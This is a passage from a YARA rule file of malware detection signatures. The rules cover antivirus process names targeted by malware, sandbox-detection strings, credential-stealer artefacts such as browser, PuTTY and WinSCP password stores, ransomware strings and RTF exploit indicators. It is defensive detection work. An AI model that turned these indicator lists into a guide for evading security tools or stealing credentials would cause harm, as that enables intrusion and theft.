$a327 = "notstart.exe" nocase wide ascii
$a329 = "npfmessenger.exe" nocase wide ascii
$a330 = "nprotect.exe" nocase wide ascii
$a331 = "npscheck.exe" nocase wide ascii
$a332 = "npssvc.exe" nocase wide ascii
$a333 = "nsched32.exe" nocase wide ascii
$a334 = "nssys32.exe" nocase wide ascii
$a335 = "nstask32.exe" nocase wide ascii
$a336 = "nsupdate.exe" nocase wide ascii
$a338 = "ntrtscan.exe" nocase wide ascii
$a340 = "ntxconfig.exe" nocase wide ascii
$a341 = "nui.exe" nocase wide ascii
$a342 = "nupgrade.exe" nocase wide ascii
$a343 = "nvarch16.exe" nocase wide ascii
$a344 = "nvc95.exe" nocase wide ascii
$a345 = "nvsvc32.exe" nocase wide ascii
$a346 = "nwinst4.exe" nocase wide ascii
$a347 = "nwservice.exe" nocase wide ascii
$a348 = "nwtool16.exe" nocase wide ascii
$a350 = "onsrvr.exe" nocase wide ascii
$a351 = "optimize.exe" nocase wide ascii
$a352 = "ostronet.exe" nocase wide ascii
$a353 = "otfix.exe" nocase wide ascii
$a354 = "outpost.exe" nocase wide ascii
$a360 = "pavcl.exe" nocase wide ascii
$a361 = "pavproxy.exe" nocase wide ascii
$a362 = "pavsched.exe" nocase wide ascii
$a363 = "pavw.exe" nocase wide ascii
$a364 = "pccwin98.exe" nocase wide ascii
$a365 = "pcfwallicon.exe" nocase wide ascii
$a367 = "pcscan.exe" nocase wide ascii
$a369 = "periscope.exe" nocase wide ascii
$a370 = "persfw.exe" nocase wide ascii
$a371 = "perswf.exe" nocase wide ascii
$a372 = "pf2.exe" nocase wide ascii
$a373 = "pfwadmin.exe" nocase wide ascii
$a374 = "pgmonitr.exe" nocase wide ascii
$a375 = "pingscan.exe" nocase wide ascii
$a376 = "platin.exe" nocase wide ascii
$a377 = "pop3trap.exe" nocase wide ascii
$a378 = "poproxy.exe" nocase wide ascii
$a379 = "popscan.exe" nocase wide ascii
$a380 = "portdetective.exe" nocase wide ascii
$a381 = "portmonitor.exe" nocase wide ascii
$a382 = "powerscan.exe" nocase wide ascii
$a383 = "ppinupdt.exe" nocase wide ascii
$a384 = "pptbc.exe" nocase wide ascii
$a385 = "ppvstop.exe" nocase wide ascii
$a387 = "prmt.exe" nocase wide ascii
$a388 = "prmvr.exe" nocase wide ascii
$a389 = "procdump.exe" nocase wide ascii
$a390 = "processmonitor.exe" nocase wide ascii
$a392 = "programauditor.exe" nocase wide ascii
$a393 = "proport.exe" nocase wide ascii
$a394 = "protectx.exe" nocase wide ascii
$a395 = "pspf.exe" nocase wide ascii
$a396 = "purge.exe" nocase wide ascii
$a397 = "qconsole.exe" nocase wide ascii
$a398 = "qserver.exe" nocase wide ascii
$a399 = "rapapp.exe" nocase wide ascii
$a400 = "rav7.exe" nocase wide ascii
$a401 = "rav7win.exe" nocase wide ascii
$a404 = "rb32.exe" nocase wide ascii
$a405 = "rcsync.exe" nocase wide ascii
$a406 = "realmon.exe" nocase wide ascii
$a407 = "reged.exe" nocase wide ascii
$a410 = "rescue.exe" nocase wide ascii
$a412 = "rrguard.exe" nocase wide ascii
$a413 = "rshell.exe" nocase wide ascii
$a414 = "rtvscan.exe" nocase wide ascii
$a415 = "rtvscn95.exe" nocase wide ascii
$a416 = "rulaunch.exe" nocase wide ascii
$a421 = "safeweb.exe" nocase wide ascii
$a422 = "sahagent.exe" nocase wide ascii
$a424 = "savenow.exe" nocase wide ascii
$a425 = "sbserv.exe" nocase wide ascii
$a428 = "scan32.exe" nocase wide ascii
$a430 = "scanpm.exe" nocase wide ascii
$a431 = "scrscan.exe" nocase wide ascii
$a435 = "sfc.exe" nocase wide ascii
$a436 = "sgssfw32.exe" nocase wide ascii
$a439 = "shn.exe" nocase wide ascii
$a440 = "showbehind.exe" nocase wide ascii
$a441 = "smc.exe" nocase wide ascii
$a442 = "sms.exe" nocase wide ascii
$a443 = "smss32.exe" nocase wide ascii
$a445 = "sofi.exe" nocase wide ascii
$a447 = "spf.exe" nocase wide ascii
$a449 = "spoler.exe" nocase wide ascii
$a450 = "spoolcv.exe" nocase wide ascii
$a451 = "spoolsv32.exe" nocase wide ascii
$a452 = "spyxx.exe" nocase wide ascii
$a453 = "srexe.exe" nocase wide ascii
$a454 = "srng.exe" nocase wide ascii
$a455 = "ss3edit.exe" nocase wide ascii
$a457 = "ssgrate.exe" nocase wide ascii
$a458 = "st2.exe" nocase wide ascii fullword
$a461 = "supftrl.exe" nocase wide ascii
$a470 = "symproxysvc.exe" nocase wide ascii
$a471 = "symtray.exe" nocase wide ascii
$a472 = "sysedit.exe" nocase wide ascii
$a480 = "taumon.exe" nocase wide ascii
$a481 = "tbscan.exe" nocase wide ascii
$a483 = "tca.exe" nocase wide ascii
$a484 = "tcm.exe" nocase wide ascii
$a488 = "teekids.exe" nocase wide ascii
$a489 = "tfak.exe" nocase wide ascii
$a490 = "tfak5.exe" nocase wide ascii
$a491 = "tgbob.exe" nocase wide ascii
$a492 = "titanin.exe" nocase wide ascii
$a493 = "titaninxp.exe" nocase wide ascii
$a496 = "trjscan.exe" nocase wide ascii
$a500 = "tvmd.exe" nocase wide ascii
$a501 = "tvtmd.exe" nocase wide ascii
$a513 = "vet32.exe" nocase wide ascii
$a514 = "vet95.exe" nocase wide ascii
$a515 = "vettray.exe" nocase wide ascii
$a517 = "vir-help.exe" nocase wide ascii
$a519 = "vnlan300.exe" nocase wide ascii
$a520 = "vnpc3000.exe" nocase wide ascii
$a521 = "vpc32.exe" nocase wide ascii
$a522 = "vpc42.exe" nocase wide ascii
$a523 = "vpfw30s.exe" nocase wide ascii
$a524 = "vptray.exe" nocase wide ascii
$a525 = "vscan40.exe" nocase wide ascii
$a527 = "vsched.exe" nocase wide ascii
$a528 = "vsecomr.exe" nocase wide ascii
$a529 = "vshwin32.exe" nocase wide ascii
$a531 = "vsmain.exe" nocase wide ascii
$a532 = "vsmon.exe" nocase wide ascii
$a533 = "vsstat.exe" nocase wide ascii
$a534 = "vswin9xe.exe" nocase wide ascii
$a535 = "vswinntse.exe" nocase wide ascii
$a536 = "vswinperse.exe" nocase wide ascii
$a537 = "w32dsm89.exe" nocase wide ascii
$a538 = "w9x.exe" nocase wide ascii
$a541 = "webscanx.exe" nocase wide ascii
$a543 = "wfindv32.exe" nocase wide ascii
$a545 = "wimmun32.exe" nocase wide ascii
$a566 = "wnad.exe" nocase wide ascii
$a567 = "wnt.exe" nocase wide ascii
$a568 = "wradmin.exe" nocase wide ascii
$a569 = "wrctrl.exe" nocase wide ascii
$a570 = "wsbgate.exe" nocase wide ascii
$a573 = "wyvernworksfirewall.exe" nocase wide ascii
$a575 = "zapro.exe" nocase wide ascii
$a577 = "zatutor.exe" nocase wide ascii
$a579 = "zonealarm.exe" nocase wide ascii
// Strings from Dubnium below
$a580 = "QQPCRTP.exe" nocase wide ascii
$a581 = "QQPCTray.exe" nocase wide ascii
$a582 = "ZhuDongFangYu.exe" nocase wide ascii
$a583 = /360(tray|sd|rp).exe/ nocase wide ascii
$a584 = /qh(safetray|watchdog|activedefense).exe/ nocase wide ascii
$a585 = "McNASvc.exe" nocase wide ascii
$a586 = "MpfSrv.exe" nocase wide ascii
$a587 = "McProxy.exe" nocase wide ascii
$a588 = "mcmscsvc.exe" nocase wide ascii
$a589 = "McUICnt.exe" nocase wide ascii
$a590 = /ui(WatchDog|seagnt|winmgr).exe/ nocase wide ascii
$a591 = "ufseagnt.exe" nocase wide ascii
$a592 = /core(serviceshell|frameworkhost).exe/ nocase wide ascii
$a593 = /ay(agent|rtsrv|updsrv).aye/ nocase wide ascii
$a594 = /avast(ui|svc).exe/ nocase wide ascii
$a595 = /ms(seces|mpeng).exe/ nocase wide ascii
$a596 = "afwserv.exe" nocase wide ascii
$a597 = "FiddlerUser"
condition:
2 of them
}
rule SSC_sandboxdetect_misc : sandboxdetect
{
meta:
author = "AlienVault Labs"
type = "info"
severity = 1
description = "Sandbox detection tricks"
strings:
$sbxie1 = "sbiedll" nocase ascii wide
// CWSandbox
$prodid1 = "55274-640-2673064-23950" ascii wide
$prodid2 = "76487-644-3177037-23510" ascii wide
$prodid3 = "76487-337-8429955-22614" ascii wide
$proc1 = "joeboxserver" ascii wide
$proc2 = "joeboxcontrol" ascii wide
condition:
any of them
}
rule SSC_Ins_NSIS_Buer
{
strings:
$s1 = "\\Microsoft\\Internet Explorer\\Quick Launch"
$s2 = "Software\\Microsoft\\Windows\\CurrentVersion"
$s3 = "Control Panel\\Desktop\\ResourceLocale"
$s4 = { 25 73 25 73 2E 64 6C 6C }
$s5 = "CRYPTBASE" nocase
$s6 = "PROPSYS" nocase
$s7 = "APPHELP" nocase
$s8 = "NSIS Error" nocase
$s9 = { 25 75 2E 25 75 25 73 25 73 }
$s10 = { 5B 52 65 6E 61 6D 65 5D 0D 0A 00 00 25 73 3D 25 73 }
condition:
7 of them and filesize > 200KB
}
rule SSC_Autogen_DropperX
{
meta:
author = "FileScan.IO Engine v1.1.0-0613c22"
date = "2023-02-20"
sample = "4562713102f34b97721f4dfe1bb62f25779b046c0111946103beb39cabea6a97"
score = 100
tags = "overlay,packed,shell32.dll"
isWeakRule = true
strings:
//IOC patterns
$req0 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"
$req1 = "Installer integrity check has failed. Common causes include\nincomplete download and damaged media. Contact the\ninstaller's autho"
$req2 = "Software\\Microsoft\\Windows\\CurrentVersion"
//optional strings
$opt0 = "ADVAPI32.dll"
$opt1 = "AdjustTokenPrivileges"
$opt2 = "COMCTL32.dll"
$opt3 = "CallWindowProcA"
$opt4 = "CloseClipboard"
$opt5 = "CoCreateInstance"
$opt6 = "CoTaskMemFree"
$opt7 = "CompareFileTime"
$opt8 = "Control Panel\\Desktop\\ResourceLocale"
$opt9 = "CreateDirectoryA"
$opt10 = "CreateFileA"
$opt11 = "CreateProcessA"
$opt12 = "CreateThread"
$opt13 = "CreateWindowExA"
$opt14 = "DefWindowProcA"
$opt15 = "DeleteFileA"
$opt16 = "DestroyWindow"
$opt17 = "DispatchMessageA"
$opt18 = "EmptyClipboard"
$opt19 = "EnableWindow"
$opt20 = "ExitProcess"
$opt21 = "ExitWindowsEx"
$opt22 = "ExpandEnvironmentStringsA"
$opt23 = "FindFirstFileA"
$opt24 = "FindNextFileA"
$opt25 = "FindWindowExA"
$opt26 = "FreeLibrary"
$opt27 = "GetCommandLineA"
$opt28 = "GetCurrentProcess"
$opt29 = "GetDiskFreeSpaceA"
$opt30 = "GetDiskFreeSpaceExA"
$opt31 = "GetExitCodeProcess"
$opt32 = "GetFileAttributesA"
$opt33 = "GetFileSize"
$opt34 = "GetFileVersionInfoA"
$opt35 = "GetFileVersionInfoSizeA"
$opt36 = "GetFullPathNameA"
$opt37 = "GetLastError"
$opt38 = "GetMessagePos"
$opt39 = "GetModuleFileNameA"
$opt40 = "GetModuleHandleA"
$opt41 = "GetPrivateProfileStringA"
$opt42 = "GetProcAddress"
$opt43 = "GetShortPathNameA"
$opt44 = "GetSystemDirectoryA"
$opt45 = "GetSystemMetrics"
$opt46 = "GetTempFileNameA"
$opt47 = "GetTempPathA"
$opt48 = "GetTickCount"
$opt49 = "GetVersionExA"
$opt50 = "GetWindowLongA"
$opt51 = "GetWindowsDirectoryA"
$opt52 = "GlobalAlloc"
$opt53 = "GlobalFree"
$opt54 = "GlobalLock"
$opt55 = "GlobalUnlock"
$opt56 = "IsWindowEnabled"
$opt57 = "IsWindowVisible"
$opt58 = "KERNEL32.dll"
$opt59 = "LoadCursorA"
$opt60 = "LoadLibraryExA"
$opt61 = "LookupPrivilegeValueA"
$opt62 = "MoveFileExA"
$opt63 = "OleInitialize"
$opt64 = "OleUninitialize"
$opt65 = "OpenClipboard"
$opt66 = "OpenProcessToken"
$opt67 = "PeekMessageA"
$opt68 = "PostQuitMessage"
$opt69 = "RegCloseKey"
$opt70 = "RegCreateKeyExA"
$opt71 = "RegDeleteKeyA"
$opt72 = "RegDeleteKeyExA"
$opt73 = "RegDeleteValueA"
$opt74 = "RegEnumKeyA"
$opt75 = "RegEnumValueA"
$opt76 = "RegOpenKeyExA"
$opt77 = "RegQueryValueExA"
$opt78 = "RegSetValueExA"
$opt79 = "RegisterClassA"
$opt80 = "RemoveDirectoryA"
$opt81 = "SHAutoComplete"
$opt82 = "SHBrowseForFolderA"
$opt83 = "SHELL32.dll"
$opt84 = "SHFileOperationA"
$opt85 = "SHGetFileInfoA"
$opt86 = "SHGetFolderPathA"
$opt87 = "SHGetKnownFolderPath"
$opt88 = "SHGetPathFromIDListA"
$opt89 = "SHGetSpecialFolderLocation"
$opt90 = "SearchPathA"
$opt91 = "SendMessageA"
$opt92 = "SendMessageTimeoutA"
$opt93 = "SetClipboardData"
$opt94 = "SetCurrentDirectoryA"
$opt95 = "SetDefaultDllDirectories"
$opt96 = "SetEnvironmentVariableA"
$opt97 = "SetErrorMode"
$opt98 = "SetFileAttributesA"
$opt99 = "SetFilePointer"
$opt100 = "SetFileSecurityA"
$opt101 = "SetFileTime"
$opt102 = "SetForegroundWindow"
$opt103 = "SetWindowLongA"
$opt104 = "SetWindowPos"
$opt105 = "ShellExecuteExA"
$opt106 = "ShowWindow"
$opt107 = "SystemParametersInfoA"
$opt108 = "USER32.dll"
$opt109 = "WaitForSingleObject"
$opt110 = "WritePrivateProfileStringA"
condition:
//require 50% of optional strings GGGGGG
uint16(0) == 0x5A4D and filesize > 300000 and filesize < 9000KB and all of ($req*) and 60 of ($opt*)
}
rule SSC_Sality : injector
{
meta:
author = "SSC Searches"
date = "2016-01-21"
description = "Rules generated for featurememdumpdetection"
version = "1.0"
names = "Sality"
sample = "md5: 5e4f1f1aa595c354413090e172e8fd91"
strings:
$fileMapping_1 = "purity_control_90833"
$fileMapping_2 = "hh8geqpHJTkdns0"
condition:
any of them
}
rule SSC_Generic_Unsafe_NetworkActivity
{
meta:
author = "@neonprimetime"
description = "Generic Network Activity"
strings:
$getSock = "getsock" nocase
$netSocket = "System.Net.Sockets" nocase
$httpweb = "HttpWebRequest" nocase
$httpres = "HttpWebResponse" nocase
$useragent = "set_UserAgent" nocase
$keepalive = "KeepAlive" nocase
$httpregex = "http|https" nocase
condition:
6 of them and filesize > 1KB and filesize < 12000KB
}
rule SSC_GenericWebcam_Rat
{
meta:
author = "@neonprimetime"
description = "Generic Webcam Access"
strings:
$string1 = "webcam" nocase
$string2 = "OpenCamera" nocase
$string3 = "CloseCamera" nocase
condition:
all of them and filesize > 5KB and filesize < 12000KB
}
rule SSC_Generic_SpyStealer
{
meta:
author = "@neonprimetime"
description = "Generic Credential Stealer"
strings:
$outlookPwd = "Profiles\\Outlook" nocase
$chromePwd = "Login Data" nocase
$encPwd = "encryptedPassword" nocase
$httpPwd = "HTTP Password" nocase
$profilePwd = "\\profiles.ini" nocase
$emailPwd = "\\POP3 Password" nocase
$puttyPwd = "PuTTY\\Sessions" nocase
$eastyFTPPwd = "EasyFTP\\data" nocase
$ftpPwd = "Ftplist.txt" nocase
$chromePwd2 = "\\Login Data" nocase
$wsFTPPwd = "\\ws_ftp.ini" nocase
$accountsPwd = "\\accounts.ini" nocase
$accountsPwd2 = "\\accounts.dat" nocase
$sqlPwd = "CREATE TABLE logins" nocase
$sqlPwd2 = "CREATE INDEX logins_signon" nocase
$internetexplorerPwd = "DecryptIePassword" nocase
$savedPwd = "GetSavedPasswords" nocase
$pwdFolder = "\\Passwords\\" nocase
$winSCPPwd = "WinSCP 2\\Sessions" nocase
$httpPwd2 = "HTTP Password" nocase
$imapPwd = "IMAP Password" nocase
$smtpPwd = "SMTP Password" nocase
$emailPwd2 = "POP3 Password" nocase
$passwords = "[passwords]" nocase
$loginPwd = "login-form" nocase
$recentServerPwd = "recentservers.xml" nocase
$passwordType = "type=passwords" nocase
$userPwd = "user-password" nocase
$pwdList = "PasswordsList.txt" nocase
$pwdUpload = "UploadPassword" nocase
$vaultPwd = "vaultcli.dll" nocase
$wifiPwd = "WiFi Recovered" nocase
$userPwd2 = "PasswordsUser" nocase
$wifiPwd2 = "show profileKey" nocase
$hashHere = "TheHashHere" nocase
$passwordHere = "Password:" nocase
$passwordHere2 = "Password=" nocase
condition:
3 of them
}
rule SSC_AGENT_CU_OneDrv : ClientUploader
{
meta:
Author = "CISA Code & Media Analysis"
Incident = "10365227"
Date = "2021-12-23"
Last_Modified = "20211224_1200"
Actor = "n/a"
Category = "n/a"
Family = "n/a"
Description = "Detects ClientUploader_onedrv"
MD5_1 = "806998079c80f53afae3b0366bac1479"
SHA256_1 = "84164e1e8074c2565d3cd178babd93694ce54811641a77ffdc8d1084dd468afb"
strings:
$s1 = "Decoder2"
$s2 = "ClientUploader"
$s3 = "AppDomain"
$s4 = { 5F 49 73 52 65 70 47 ?? 44 65 63 6F 64 65 72 73 }
$s5 = "LzmaDecoder"
$s6 = "$ee1b3f3b-b13c-432e-a461-e52d273896a7"
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Bat_Msg_ForkSpam
{
strings:
$s1 = { 6D 73 67 20 }
$s2 = { 6D 73 67 20 }
$s3 = { 6D 73 67 20 }
$s4 = { 6D 73 67 20 }
$s5 = { 6D 73 67 20 }
condition:
all of them and #s1 > 5 and filesize < 400KB
}
rule SSC_XVoidCrypt_PYLD_RANSOMx
{
meta:
author = "rivitna"
family = "ransomware.voidcrypt.windows"
description = "VoidCrypt ransomware Windows payload"
severity = 10
score = 100
strings:
$s1 = "C:\\Users\\Legion\\source\\repos\\curl\\" ascii
$s2 = "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM" ascii
$s3 = "C:\\ProgramData\\IDk.txt" ascii
$s4 = "C:\\ProgramData\\pkey.txt" ascii
$s5 = "C:\\ProgramData\\prvkey" ascii
$s6 = "fuckyoufuckyoufuckyoufuckyoufuckyou" ascii
$s7 = "\x00net stop MSSQL$CONTOSO1\x00" ascii
$s8 = "https://api.my-ip.io/ip" ascii
$s9 = "\x00threaad\x00"
$s10 = "\x00  Disksize=\x00"
condition:
((uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550)) and
(
(5 of ($s*))
)
}
rule SSC_POWERSHELL_xKiller_OBV
{
strings:
$s1 = "while(1)"
$s1x = "while(true)" nocase
$s2 = "{&"
$s3 = "}"
condition:
filesize < 10KB and ($s1 or $s1x) and $s2 and $s3
}
rule SSC_apt_miniasp_pdb {
meta:
description = "Rule to detect MiniASP based on PDB"
author = "Marc Rivero | McAfee ATR Team"
date = "2012-07-12"
rule_version = "v1"
malware_type = "trojan"
malware_family = "Trojan:W32/MiniASP"
actor_type = "Apt"
actor_group = "Unknown"
reference = "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf"
hash = "42334f2119069b8c0ececfb14a7030e480b5d18ca1cc35f1ceaee847bc040e53"
strings:
$pdb = "\\Project\\mm\\Wininet\\Attack\\MiniAsp4\\Release\\MiniAsp.pdb"
$pdb1 = "\\XiaoME\\AiH\\20120410\\Attack\\MiniAsp3\\Release\\MiniAsp.pdb"
condition:
uint16(0) == 0x5a4d and
filesize < 80KB and
any of them
}
rule SSC_CS_DLL {
meta:
description = "62.dll"
author = "The DFIR Report"
reference = "https://thedfirreport.com"
date = "2021-07-07"
hash1 = "8b9d605b826258e07e63687d1cefb078008e1a9c48c34bc131d7781b142c84ab"
strings:
$s1 = "Common causes completion include incomplete download and damaged media" fullword ascii
$s2 = "StartW" fullword ascii
$s4 = ".rdata$zzzdbg" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 70KB and ( pe.imphash() == "42205b145650671fa4469a6321ccf8bf" )
or (all of them)
}
rule SSC_Unsafe_VRT_MEM_MODx
{
strings:
$s1 = { ?E 74 ?0 72 6F 74 65 63 74 ?6 69 72 74 75 61 6C ?D 65 6D 6F 72 79 }
$s2 = "Wscript" nocase
condition:
all of them and filesize > 5KB and filesize < 5000KB
}
rule SSC_Trojan_DownloaderX {
meta:
description = "Trojan Downloader - Flash Exploit Feb15"
author = "Florian Roth"
reference = "http://goo.gl/wJ8V1I"
date = "2015/02/11"
hash = "5b8d4280ff6fc9c8e1b9593cbaeb04a29e64a81e"
score = 60
strings:
$x1 = "Hello World!" fullword ascii
$x2 = "CONIN$" fullword ascii
$s6 = "GetCommandLineA" fullword ascii
$s7 = "ExitProcess" fullword ascii
$s8 = "CreateFileA" fullword ascii
$s5 = "SetConsoleMode" fullword ascii
$s9 = "TerminateProcess" fullword ascii
$s10 = "GetCurrentProcess" fullword ascii
$s11 = "UnhandledExceptionFilter" fullword ascii
$s3 = "user32.dll" fullword ascii
$s16 = "GetEnvironmentStrings" fullword ascii
$s2 = "GetLastActivePopup" fullword ascii
$s17 = "GetFileType" fullword ascii
$s19 = "HeapCreate" fullword ascii
$s20 = "VirtualFree" fullword ascii
$s21 = "WriteFile" fullword ascii
$s22 = "GetOEMCP" fullword ascii
$s23 = "VirtualAlloc" fullword ascii
$s24 = "GetProcAddress" fullword ascii
$s26 = "FlushFileBuffers" fullword ascii
$s27 = "SetStdHandle" fullword ascii
$s28 = "KERNEL32.dll" fullword ascii
condition:
$x1 and $x2 and ( all of ($s*) ) and filesize < 36000
}
rule SSC_LightFTPx {
meta:
description = "Detects a light FTP server"
author = "Florian Roth"
reference = "https://github.com/hfiref0x/LightFTP"
date = "2015-05-14"
hash1 = "989525f85abef05581ccab673e81df3f5d50be36"
hash2 = "5884aeca33429830b39eba6d3ddb00680037faf4"
score = 50
strings:
$s1 = "fftp.cfg" fullword wide
$s2 = "220 LightFTP server v1.0 ready" fullword ascii
$s3 = "*FTP thread exit*" fullword wide
$s4 = "PASS->logon successful" fullword ascii
$s5 = "250 Requested file action okay, completed." fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 250KB and 4 of them
}
rule SSC_ice_ix_12xy : banker
{
meta:
author = "Jean-Philippe Teissier / @Jipe_"
description = "ICE-IX 1.2.x.y trojan banker"
date = "2013-01-12"
filetype = "memory"
version = "1.0"
strings:
$regexp1= /bn1=.{32}&sk1=[0-9a-zA-Z]{32}/
$a = "bn1="
$b = "&sk1="
$c = "mario"								//HardDrive GUID artifact
$d = "FIXME"
$e = "RFB 003.003"							//VNC artifact
$ggurl = "http://www.google.com/webhp"
condition:
$regexp1 or ($a and $b) or all of ($c,$d,$e,$ggurl)
}
rule SSC_DownExecuteAx
{
meta:
Author      = "PwC Cyber Threat Operations :: @tlansec"
Date        = "2015/04/27"
Description = "Malware is often wrapped/protected, best to run on memory"
Reference   = "http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html"
strings:
$winver1 = "win 8.1"
$winver2 = "win Server 2012 R2"
$winver3 = "win Srv 2012"
$winver4 = "win srv 2008 R2"
$winver5 = "win srv 2008"
$winver6 = "win vsta"
$winver7 = "win srv 2003 R2"
$winver8 = "win hm srv"
$winver9 = "win Strg srv 2003"
$winver10 = "win srv 2003"
$winver11 = "win XP prof x64 edt"
$winver12 = "win XP"
$winver13 = "win 2000"
$pdb1 = "D:\\Acms\\2\\docs\\Visual Studio 2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb"
$pdb2 = "d:\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h"
$pdb3 = ":\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal/stack.h"
$pdb4 = "\\downloadexcute\\downexecute\\"
$magic1 = "<Win Get Version Info Name Error"
$magic2 = "P@$sw0rd$nd"
$magic3 = "$t@k0v2rF10w"
$magic4 = "|*|123xXx(Mutex)xXx321|*|6-21-2014-03:06PM" wide
$str1 = "Download Excute" ascii wide fullword
$str2 = "EncryptorFunctionPointer %d"
$str3 = "%s\\%s.lnk"
$str4 = "Mac:%s-Cpu:%s-HD:%s"
$str5 = "feed back responce of host"
$str6 = "GET Token at host"
$str7 = "dwn md5 err"
condition:
all of ($winver*) or any of ($pdb*) or any of ($magic*) or 2 of ($str*)
}
rule SSC_CredSteal_ESYx : For CredStealer
{
meta:
description = "Generic Rule to detect the CredStealer Malware"
author = "IsecG  McAfee Labs"
date = "2015/05/08"
strings:
$my_hex_string = "CurrentControlSet\\Control\\Keyboard Layouts\\" wide //malware trying to get keyboard layout
$my_hex_string2 = {89 45 E8 3B 7D E8 7C 0F 8B 45 E8 05 FF 00 00 00 2B C7 89 45 E8} //specific decryption module
condition:
$my_hex_string and $my_hex_string2
}
rule SSC_STR_Inv_TransformX {
meta:
description = "Detects typical strings in a reversed or otherwise modified form"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-31"
score = 60
strings:
/* Executables */
$e1 = "exe.tsohcvs" fullword ascii
$e2 = "exe.ssasl" fullword ascii
$e3 = "exe.rerolpxe" fullword ascii
$e4 = "exe.erolpxei" fullword ascii
$e5 = "exe.23lldnur" fullword ascii
$e6 = "exe.dmc" fullword ascii
$e7 = "exe.llikksat" fullword ascii
/* Libraries */
$l1 = "lld.23lenreK" fullword ascii
$l2 = "lld.ESABLENREK" fullword ascii
$l3 = "lld.esabtpyrc" fullword ascii
$l4 = "lld.trcvsm" fullword ascii
$l5 = "LLD.LLDTN" fullword ascii
/* Imports */
$i1 = "paeHssecorPteG" fullword ascii
$i2 = "sserddAcorPteG" fullword ascii
$i3 = "AyrarbiLdaoL" fullword ascii
/* Registry */
$r1 = "teSlortnoCtnerruC" fullword ascii
$r2 = "nuR\\noisreVtnerruC" fullword ascii
/* Folders */
$f1 = "\\23metsys\\" ascii
$f2 = "\\23metsyS\\" ascii
$f3 = "niB.elcyceR$" fullword ascii
$f4 = "%tooRmetsyS%" fullword ascii
/* False Positives */
$fp1 = "Application Impact Telemetry Static Analyzer" fullword wide
condition:
( uint16(0) == 0x5a4d and 1 of them and not 1 of ($fp*) ) and filesize < 8000KB
}
rule SSC_INDICATOR_RTF_EXPLOIT_CVE_2017_11882_1 {
meta:
description = "Detects RTF documents potentially exploiting CVE-2017-11882"
author = "ditekSHen"
strings:
$s1 = { 30 32 ?3 ?5 30 32 30 30 30 30 30 30 30 30 30 30 ?3 30 30 30 30 30 30 30 30 30 30 30 30 30 34 36 }
// Root Entry
$s2 = "52006f006f007400200045006e00740072007900" ascii nocase
// OLE Signature
$ole1 = "d0cf11e0a1b11ae1" ascii nocase
$olex = { (64|44)[0-1]30[0-1](63|43)[0-1](66|46)[0-1]31[0-1]31[0-1](65|45)[0-1]30[0-1](61|41)[0-1]31[0-1](62|42)[0-1]31[0-1]31[0-1](61|41) }
$obj1 = "\\objhtml" ascii
$obj2 = "\\objdata" ascii
$obj3 = "\\objupdate" ascii
$obj4 = "\\objemb" ascii
$obj5 = "\\objautlink" ascii
$obj6 = "\\objlink" ascii
condition:
uint32(0) == 0x74725c7b and all of ($s*) and 2 of ($obj*) and 1 of ($ole*)
}
rule SSC_INDICATOR_RTF_EXPLOIT_CVE_2017_11882_2 {
meta:
description = "detects an obfuscated RTF variant documents potentially exploiting CVE-2017-11882"
author = "ditekSHen"
strings:
// 0002CE02-0000-0000-C000-000000000046: Equation
// CVE-2017-11882 or CVE-2018-0802
$eq1 = "02ce020000000000c000000000000046" ascii nocase
$eq2 = "equation." ascii nocase
$eq3 = "6551754174496f4e2e33" ascii nocase
// Embedded Objects
$obj1 = "\\objhtml" ascii
$obj2 = "\\objdata" ascii
$obj3 = "\\objupdate" ascii
$obj4 = "\\objemb" ascii
$obj5 = "\\objautlink" ascii
$obj6 = "\\objlink" ascii
$obj7 = "\\mmath" ascii
// Shellcode Artefacts
$s1 = "4c6f61644c696272617279" ascii nocase                // LoadLibrary
$s2 = "47657450726f6341646472657373" ascii nocase          // GetProcAddress
$s3 = "55524c446f776e6c6f6164546f46696c65" ascii nocase    // URLDownloadToFile
$s4 = "5368656c6c45786563757465" ascii nocase              // ShellExecute
$s5 = "4578697450726f63657373" ascii nocase                // ExitProcess
condition:
uint32(0) == 0x74725c7b and 1 of ($eq*) and 1 of ($obj*) and 2 of ($s*)
}
rule SSC_INDICATOR_RTF_MalVer_Objects {
meta:
description = "Detects RTF documents with non-standard version and embeding one of the object mostly observed in exploit documents."
author = "ditekSHen"
strings:
// Embedded Objects
$obj1 = "\\objhtml" ascii
$obj2 = "\\objdata" ascii
$obj3 = "\\objupdate" ascii
$obj4 = "\\objemb" ascii
$obj5 = "\\objautlink" ascii
$obj6 = "\\objlink" ascii
condition:
uint32(0) == 0x74725c7b and ((not uint8(4) == 0x66 or not uint8(5) == 0x31 or not uint8(6) == 0x5c) and 1 of ($obj*))
}
rule SSC_RTF_Sus_File_Extn
{
meta:
author         = "InQuest Labs"
description    = "This signature detects RTF files with an 'objdata' directive and a reference to a file extension deemed as executable."
created_date   = "2022-03-15"
updated_date   = "2022-03-15"
blog_reference = "http://www.biblioscape.com/rtf15_spec.htm"
labs_reference = "N/A"
labs_pivot     = "N/A"
samples        = "14ab1a85b0d6791f15952da15706b7997dd6ebdbbc9aea816e90f6009feb4b3c"
strings:
// '{\rt' (note that full header is *NOT* required: '{\rtf1')
$magic = "{\\rt"
$objstuff = /\\obj(data|update)/
$ext_00 = /2e[46]5[57]8[46]500/ nocase     // .exe\x00
$ext_01 = /2e[57]3[46]3[57]400/ nocase     // .sct\x00
$ext_02 = /2e[57]3[46]3[57]200/ nocase     // .scr\x00
$ext_03 = /2e[46]2[46]1[57]400/ nocase     // .bat\x00
$ext_04 = /2e[57]0[57]33100/    nocase     // .ps1\x00
